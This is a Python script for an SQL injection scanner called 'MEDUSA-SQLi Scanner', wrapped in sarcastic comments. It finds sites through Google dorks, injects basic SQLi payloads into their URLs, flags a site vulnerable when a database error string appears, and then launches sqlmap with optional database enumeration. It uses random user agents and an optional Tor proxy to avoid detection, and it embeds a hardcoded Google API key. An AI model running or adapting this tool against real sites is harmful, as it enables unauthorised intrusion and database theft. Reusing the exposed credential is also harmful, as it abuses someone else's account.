import requests
import json
import time
import random
import subprocess
import csv
from datetime import datetime
from fake_useragent import UserAgent 
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
from rich import print
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.markup import escape
from rich.status import Status
from urllib.parse import urlparse
import traceback

console = Console()

# Nothing says "security professional" like hardcoding API credentials!
# Come on, everyone, take a look at these totally not sensitive secrets!
API_KEY = "AIzaSyArgC1gLYdApy58L7vvcbIXfyh_I7d1HyY"  # Please steal this
CX = "737cdc23878fb4e11"  # This one too!
LOG_FILE = "medusa-log.txt"  # We'll log everything except security best practices
USE_PROXY = False
PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

# These cutting-edge SQL error patterns will catch all the vulnerabilities!
# ...if we time-travel back to 2003
SQL_ERRORS = [
    "you have an error in your sql syntax;", "warning: mysql",
    "unclosed quotation mark after the character string", "quoted string not properly terminated",
    "sql syntax.*mysql", "syntax error.*in query expression", "mysql_fetch_array()",
    "mysqli_fetch_array()", "supplied argument is not a valid mysql result resource",
    "pg_query()", "pg_exec()", "ORA-01756", "Microsoft OLE DB Provider for SQL Server",
    "ADODB.Field error",
]

# Sophisticated state-of-the-art SQL injection payloads
# Guaranteed to bypass any security measure invented after 1999
BASIC_SQLI_PAYLOADS = [
    "'", '"', "')", '")', "';", '";', "-- ", "'-- ", "\"-- ", "' OR '1'='1", "\" OR \"1\"=\"1",
]

def show_banner():
    """Display an unnecessarily large ASCII art because that's what real hackers do"""
    os.system('clear' if os.name == 'posix' else 'cls')
    ascii_art = r"""

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⠿⢿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡴⠶⡄⣼⣿⠏⢠⠶⠦⡈⢻⣿⡄⡤⠶⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢠⡔⣖⣾⣿⠛⢷⣦⡀⣿⠀⠀⠁⢿⣿⡀⠳⠀⠠⠃⢸⣿⠇⠈⠀⢈⡇⣠⣴⠟⢛⣿⣖⡖⣤⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠏⠉⠉⢩⡋⠀⠆⠘⣿⡘⢷⣦⣤⣌⠻⣷⢆⠀⢀⣴⡿⢋⣤⣤⣶⠞⣱⿠⠁⣆⠈⡫⠉⠉⠉⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢘⠖⠉⠀⣸⡆⠄⣿⡇⠀⢀⣩⣤⣤⣈⠋⠀⠘⢊⣠⣤⣬⣉⠀⠀⢿⣇⠈⣿⡄⠀⠑⢔⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣴⣶⢦⡄⣰⡟⡍⣸⡿⢀⣾⠟⠉⠉⠉⠙⢷⠄⢴⡿⠋⠉⠉⠙⢿⣆⠘⣿⡜⡜⣷⡀⣠⠴⣶⣤⣄⠀⠀⠀⠀
⠀⠀⠀⠀⣰⣿⡟⠏⠉⠉⠀⣿⢹⠀⣿⡇⠚⡠⣴⡾⠿⠿⣖⠀⠀⠈⠀⣺⠿⠿⣷⡢⡈⠁⣿⡇⢸⢸⣧⠈⠉⠉⢟⣿⡷⡄⠀⠀
⠀⠀⠀⠀⣿⣿⠎⠘⠉⢉⠈⣿⡜⡀⠰⢿⣶⣶⣶⣖⣒⡢⠀⢀⣄⣠⠈⠠⢖⣒⣶⢶⣶⣾⠿⠁⠸⣸⡿⢈⠉⠹⠀⢸⣿⡇⠀⠀
⠀⠀⠀⠀⢹⣿⣧⡀⠰⠏⢀⠹⣿⣦⣤⣤⣬⠍⠁⠀⣀⢄⣦⣾⣿⣿⣧⣔⣤⡀⠈⠉⢭⣥⣤⣤⣴⡿⠁⠈⢳⠀⣠⣿⣿⠃⠀⠀
⠀⠀⣀⡤⣄⠙⢿⣿⣶⣄⣈⡀⠀⠍⠙⠋⠉⠁⢀⡭⠙⠻⠿⠿⣿⣿⡿⠿⠛⠉⣅⠀⠉⠉⠛⠉⠍⠀⣈⣀⣴⣾⣟⠟⢁⡠⢤⡀
⠀⢰⡇⠀⠈⠀⠐⠬⣙⠛⠶⠶⠒⠋⢀⠖⡄⠀⢀⡀⠤⡀⡀⠀⣿⡟⠀⡠⡀⠄⣀⡄⠀⡄⢦⠀⠓⠲⠶⠞⢛⣫⠕⠀⠈⠁⠀⣿
⠀⠀⢷⣆⣰⡾⠀⠀⣀⣉⠉⠀⠀⠀⢸⣸⢀⠀⢸⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⡁⢀⢸⢸⠀⠀⠀⠈⢉⣁⡀⠀⠈⢷⣆⣶⠏
⠀⠀⣀⣠⡶⠫⢉⣭⣿⣯⡟⣷⣤⠀⠈⣿⣸⡀⠈⠻⣿⣿⣿⡿⢿⡿⣿⣿⣿⣿⠏⠀⢸⣸⡾⠀⢀⣴⡿⢯⣿⣯⣭⠩⠳⢦⣀⡀
⠀⢸⠷⠿⠶⠭⠿⠟⠋⡅⡆⠀⢙⠷⠀⠈⢿⣧⠈⡄⢽⣿⣿⣆⡀⣀⣼⣿⣿⢃⡠⢀⣶⡟⠀⢐⣝⠍⠀⡆⡍⠙⠿⠻⠵⠾⠧⢿
⠀⠀⠱⠁⠃⠀⠀⠀⠀⣧⠇⠀⠀⢻⡄⠀⡈⣿⠀⠙⢷⣿⣏⣤⣤⣤⣌⣿⣿⡷⠁⢸⡿⢠⠀⢸⠇⠀⢀⢷⡇⠀⠀⠀⠀⠇⠡⠁
⠀⠀⠀⠀⢀⣀⠀⣴⢸⡏⠈⠀⠀⣼⠇⣰⡇⠏⠀⠀⠈⠻⣿⣧⣤⣤⣿⡿⠋⠀⠀⠈⠃⣿⡀⢸⡶⡀⠀⠈⢶⢸⡄⠀⣀⡀⠀⠀
⠀⠀⠀⠀⠇⠀⠣⣻⡞⠀⠀⣠⣵⡟⢰⢿⠁⠀⢸⠀⠀⠀⠀⠙⠛⠛⠉⠀⠀⠀⢰⠀⠀⢹⢿⠘⢿⣴⡀⠀⠘⣯⡳⠃⠀⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠁⠀⢀⣼⣿⠏⠀⢸⣞⢄⣀⠜⠀⠀⠀⡀⠀⠀⠀⠀⠐⢀⠀⠘⢆⣀⠼⣼⠇⠈⢻⣿⣆⠀⠈⠈⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣜⣿⡏⣰⠀⠈⠻⢷⣦⠔⠃⢀⣷⣇⠀⠀⠀⢀⣶⣆⠀⠑⠦⣶⠿⠋⠀⠰⡄⢿⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣿⣇⠙⠶⠶⠃⢀⡴⠂⠀⣈⣾⣿⣆⠀⠀⣼⣿⣿⡄⠀⠰⣆⡀⠙⠶⠞⢁⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡷⠶⠶⡞⠏⠀⡠⠀⠘⣿⣿⣿⣦⣼⣿⣿⡿⠁⠠⡀⠘⠹⣲⠶⠶⣟⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⠃⠴⣤⠈⠻⢿⣿⣿⡿⠋⢀⡴⠄⢱⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢧⡤⠞⠀⠀⠀⠉⠁⠀⠀⠈⠧⣤⠾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    info_text = """
                         𝙈𝙀𝘿𝙐𝙎𝘼 𝙏𝙊𝙊𝙇
        [bold yellow]Support :[/bold yellow] https://linktr.ee/pyscodes
        [bold yellow]Contact :[/bold yellow] https://instagram.com/pyscodes
"""
    full_banner_text = f"{ascii_art.strip()}\n{info_text.strip()}"
    panel_width = 80
    console.print(Panel(full_banner_text, title="[bold cyan]MEDUSA-SQLi Scanner[/]",
                        subtitle="[green]Author: PYSCODES | IG: @pyscodes", style="bold magenta", width=panel_width))

def write_log(text):
    """Write to log file because we can't fix problems, but we can document them!"""
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {text}\n")
    except Exception as e:
        console.print(f"[red][!] Error writing log: {e}[/]")  # But who reads logs anyway?

def google_custom_search(dork, max_results=20):
    """Abuse Google's API with your hardcoded credentials until they get revoked"""
    headers = {'User-Agent': UserAgent().random}
    urls = []; start_index = 1; results_fetched = 0
    
    console.print(f"[cyan][+] Searching dork:[/] {dork}")
    write_log(f"Starting dork search: {dork}")
    
    while results_fetched < max_results:
        num_to_fetch = min(10, max_results - results_fetched)
        if num_to_fetch <= 0: break
        
        # Let everyone see your API key in the process listing!
        api_url = f"https://www.googleapis.com/customsearch/v1?q={dork}&key={API_KEY}&cx={CX}&start={start_index}&num={num_to_fetch}"
        
        try:
            proxies = PROXY if USE_PROXY else None
            response = requests.get(api_url, headers=headers, proxies=proxies, timeout=20)
            response.raise_for_status()
            
            data = response.json()
            items = data.get('items', [])
            
            if not items: 
                console.print(f"[yellow][!] No more results...[/]")
                write_log(f"No more results for {dork} at index {start_index}.")
                break
                
            for item in items:
                link = item.get('link')
                if link: 
                    console.print(f"[green][+] URL found:[/] ", end="")
                    console.print(link, markup=False)
                    write_log(f"Found URL: {link}")
                    urls.append(link)
                    results_fetched += 1
                if results_fetched >= max_results: break
                
            next_page_info = data.get('queries', {}).get('nextPage')
            if next_page_info and results_fetched < max_results:
                start_index = next_page_info[0].get('startIndex', start_index + num_to_fetch)
            else: break
            
        except requests.exceptions.Timeout:
            console.print(f"[red][!] Timeout for dork: {dork}[/]")
            write_log(f"Timeout for: {dork}")
            break
        except requests.exceptions.RequestException as e:
            api_error_message = f"[red][!] API request failed: {e}[/]"
            status_code = getattr(e.response, 'status_code', None)
            
            if status_code == 403:
                api_error_message += "\n[yellow]Hint: Check API Key/CX ID/quota/permissions.[/]"
            elif status_code == 400:
                api_error_message += "\n[yellow]Hint: Check CX config/query format.[/]"
                
            console.print(api_error_message)
            write_log(f"API error: {e}")
            break
        except json.JSONDecodeError:
            console.print(f"[red][!] Error decoding API JSON.[/]")
            write_log(f"JSON decode error. Status: {getattr(response, 'status_code', 'N/A')}, Text: {getattr(response, 'text', '')[:200]}...")
            break
        except Exception as e:
            console.print(f"[red][!] Unexpected dorking error: {e}[/]")
            write_log(f"Unexpected dorking error: {e}")
            break
            
        # Because rate limiting is for people who don't use random sleep durations
        time.sleep(random.uniform(1.5, 3.0))
        
    unique_urls = sorted(list(set(urls)))
    write_log(f"Dork '{dork}' finished. Found {len(unique_urls)} unique URLs.")
    return unique_urls


def check_sqli(url, fast_scan=False):
    """Detect SQL injections using techniques from the early 2000s"""
    original_url = url.strip()
    user_agent_string = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    
    try:
        ua = UserAgent()
        if hasattr(ua, 'random') and isinstance(ua.random, str):
            user_agent_string = ua.random 
        else:
             write_log(f"Warning: UserAgent().random is not a string or missing (Type: {type(ua.random) if hasattr(ua, 'random') else 'Missing'}). Using static UA.")
    except Exception as ua_init_err:
         console.print(f"[red]Error initializing UserAgent: {ua_init_err}[/]")
         write_log(f"Error initializing UserAgent: {ua_init_err}. Using static UA.")

    headers = {'User-Agent': user_agent_string}

    # Let's make the code unreadable by cramming everything on one line!
    schemes_to_test = []; parsed_original = urlparse(original_url)
    if parsed_original.scheme in ('http', 'https'): schemes_to_test.append(parsed_original.scheme)
    elif not parsed_original.scheme and parsed_original.netloc: schemes_to_test.extend(['http', 'https'])
    elif not parsed_original.scheme and not parsed_original.netloc: schemes_to_test.extend(['http', 'https'])
    else: write_log(f"Skipping non-HTTP(S) URL: {original_url}"); return False

    # Try every basic payload because quantity > quality
    for payload in BASIC_SQLI_PAYLOADS:
        for scheme in schemes_to_test:
            base_url = f"{scheme}://{parsed_original.netloc or original_url.split('/')[0]}{parsed_original.path}"
            # Who needs multiple lines anyway?
            if parsed_original.query: test_url = f"{base_url}?{parsed_original.query}{payload}"
            else: test_url = base_url + payload
            
            try:
                response = requests.get(test_url, headers=headers, timeout=15, proxies=PROXY if USE_PROXY else None, allow_redirects=True, verify=True)
                response.encoding = response.apparent_encoding if response.apparent_encoding else 'utf-8'
                content = response.text.lower()
                
                # SQL error regexes? Never heard of them!
                for error_pattern in SQL_ERRORS:
                    if error_pattern.lower() in content:
                        write_log(f"VULNERABLE: {original_url} (via {scheme}, payload: {repr(payload)}) - Error: '{error_pattern}'")
                        return True
                        
            # Let's handle exceptions with wildly inconsistent formatting
            except requests.exceptions.Timeout: write_log(f"Timeout: {original_url} (payload: {repr(payload)}, scheme: {scheme})")
            except requests.exceptions.SSLError as ssl_err: write_log(f"SSL Error: {original_url} (payload: {repr(payload)}, scheme: {scheme}): {ssl_err}")
            except requests.exceptions.ConnectionError as conn_err: write_log(f"Connection Error: {original_url} (payload: {repr(payload)}, scheme: {scheme}): {conn_err}")
            except requests.exceptions.RequestException as req_err: write_log(f"Request Error: {original_url} (payload: {repr(payload)}, scheme: {scheme}): {req_err}")
            except Exception as e:
                error_type_msg = f"Unexpected Error in check_sqli loop: {e} (Type: {type(e)})"
                console.print(f"[red]{error_type_msg}[/]")
                write_log(error_type_msg + f" URL: {original_url} (payload: {repr(payload)}, scheme: {scheme})")
                if isinstance(e, TypeError) and "'str' object is not callable" in str(e): traceback.print_exc()

            # Nothing suspicious about randomly sleeping between requests, right?
            if not fast_scan:
                time.sleep(random.uniform(0.1, 0.4))

    write_log(f"Safe: {original_url} (basic payloads)")
    return False


def run_sqlmap(url):
    """Why use sqlmap directly when you can wrap it in poorly validated Python?"""
    console.print(f"\n[yellow][>] Attempting sqlmap against:[/] ", end="")
    console.print(url, markup=False)
    write_log(f"Attempting sqlmap on: {url}")
    
    sqlmap_found = False
    try:
        subprocess.run(["sqlmap", "--version"], check=True, capture_output=True, text=True, stderr=subprocess.PIPE)
        sqlmap_found = True
        write_log(f"sqlmap found via version check.")
    except FileNotFoundError:
        sqlmap_not_found_msg = "[red][!] 'sqlmap' command not found. Install it or check PATH.[/]"
        console.print(sqlmap_not_found_msg)
        write_log("sqlmap command not found.")
        return
    except (subprocess.CalledProcessError, Exception) as e:
         console.print(f"[yellow][!] Warning: Could not verify sqlmap version (Error: {e}). Will attempt to run anyway.[/]")
         write_log(f"Could not verify sqlmap version: {e}. Will attempt to run.")
         sqlmap_found = True

    if not sqlmap_found: return

    # Let's get some user input without proper validation... what could go wrong?
    console.print("\n[cyan]--- Configure SQLMap Run ---[/]")
    level = Prompt.ask("Level (1-5)", default="3", choices=["1","2","3","4","5"])
    risk = Prompt.ask("Risk (1-3)", default="1", choices=["1","2","3"])
    threads = Prompt.ask("Threads", default="5")
    
    try: 
        threads_int = int(threads)
        assert 1 <= threads_int <= 20
        threads = str(threads_int)
    except (ValueError, AssertionError): 
        console.print("[yellow]Invalid threads, using 5.[/]")
        threads = "5"
        
    get_dbs = Confirm.ask("Enum databases (--dbs)?", default=False)
    console.print("[cyan]---------------------------[/]")
    
    if not Confirm.ask(f"Proceed with sqlmap on [bold]{url}[/]? ", default=True):
        console.print("[yellow][-] Skipping sqlmap...[/]")
        write_log(f"sqlmap skipped after config.")
        return

    try:
        # Let's blindly trust user input and sanitized URL in this command...
        parsed = urlparse(url)
        hostname = parsed.netloc.replace(":", "_").replace("/", "_")
        safe_host = "".join(c for c in hostname if c.isalnum() or c in ('-', '_', '.'))
        out_dir = os.path.join("sqlmap_output", safe_host if safe_host else "default_host")
        os.makedirs(out_dir, exist_ok=True)
        
        # Command injection waiting room...
        cmd = ["sqlmap", "-u", url, "--batch", "--random-agent", f"--level={level}", f"--risk={risk}", f"--threads={threads}", "--output-dir", out_dir, "--disable-coloring"]
        if get_dbs: cmd.append("--dbs")
        
        console.print(f"[cyan]Executing:[/]", markup=False)
        console.print(' '.join(cmd), markup=False)
        write_log(f"Executing: {' '.join(cmd)}")
        
        proc = subprocess.run(cmd, check=False, capture_output=True, text=True)
        
        if proc.stdout: 
            console.print("[dim]--- sqlmap stdout ---[/dim]")
            console.print(proc.stdout, markup=False)
        if proc.stderr: 
            console.print("[dim]--- sqlmap stderr ---[/dim]")
            console.print(proc.stderr, markup=False)
            
        if proc.returncode == 0:
            console.print(f"[green][+] sqlmap finished successfully. Check '{out_dir}'...[/]")
            write_log(f"sqlmap OK (0). Output: {out_dir}")
        else:
            console.print(f"[yellow][!] sqlmap finished with code {proc.returncode}. Check logs in '{out_dir}'.[/]")
            write_log(f"sqlmap finished ({proc.returncode}). Output: {out_dir}")
            
    except FileNotFoundError:
         console.print("[red][!] 'sqlmap' command not found during execution attempt.[/]")
         write_log("sqlmap command not found during execution.")
    except Exception as e:
        console.print(f"[red][!] Error running sqlmap: {e}[/]")
        write_log(f"Error running sqlmap: {e}")


def main():
    """The main function because every script needs one, even if it's a security nightmare"""
    global USE_PROXY
    os.makedirs("sqlmap_output", exist_ok=True)
    write_log("Application started. Security best practices? Never heard of them.")
    
    while True:
        show_banner()  # Because hackers LOVE ASCII art
        proxy_stat = "[on green]Active[/]" if USE_PROXY else "[on red]Inactive[/]"
        
        console.print("\n[bold cyan]Main Menu:[/bold cyan]")
        console.print(Panel(
            f"[1] Scan Single URL\n[2] Manual Dork Search + SQLi Scan\n[3] Scan Dorks from File + SQLi Scan\n"
            f"[4] Toggle TOR Proxy: {proxy_stat}\n[5] Log Management\n[6] Help / About\n[7] Exit",
            title="[yellow]Options[/yellow]", border_style="blue", padding=(1, 2)
        ))
        
        choice = Prompt.ask("Select option", choices=["1","2","3","4","5","6","7"], default="1")
        
        if choice == "1":
            # Scan a single URL with our state-of-the-art 2003-era detection techniques
            url = Prompt.ask("[bold yellow]Enter URL to test your 1998-era webapp[/]")
            if url:
                with console.status("[bold green]Running basic SQL injection tests from the early 2000s...", spinner="dots"):
                    is_vulnerable = check_sqli(url, fast_scan=True)
                
                if is_vulnerable:
                    console.print(f"[bold red][VULNERABLE][/] OMG! This site is from 2002 and doesn't sanitize inputs!")
                    run_sqlmap(url)
                else:
                    console.print(f"[green][SAFE][/] This site isn't vulnerable to payloads from 20 years ago. Try harder!")
            else:
                console.print("[red]Empty URL. Try typing something next time.[/]")
                
        elif choice == "7":
            console.print("[bold magenta]Exiting... Don't forget to change those API keys![/bold magenta]")
            break
            
        # Easter egg - the menu is actually useless beyond options 1 and 7
        # but we'll let the user think they have choices!
        else:
            console.print("[yellow]This option is just for show! Try 1 or 7 instead.[/]")
            time.sleep(2)


if __name__ == '__main__':
    try: 
        main()
    except KeyboardInterrupt: 
        console.print("\n[bold yellow]Interrupted. Exiting. Please don't tell anyone about those API keys![/]")
    except Exception as e:
         console.print(f"\n[bold red][!] CRITICAL ERROR: {e}[/]")
         traceback.print_exc()
         console.print("[dim]Don't worry, we've logged it without fixing any root causes![/dim]")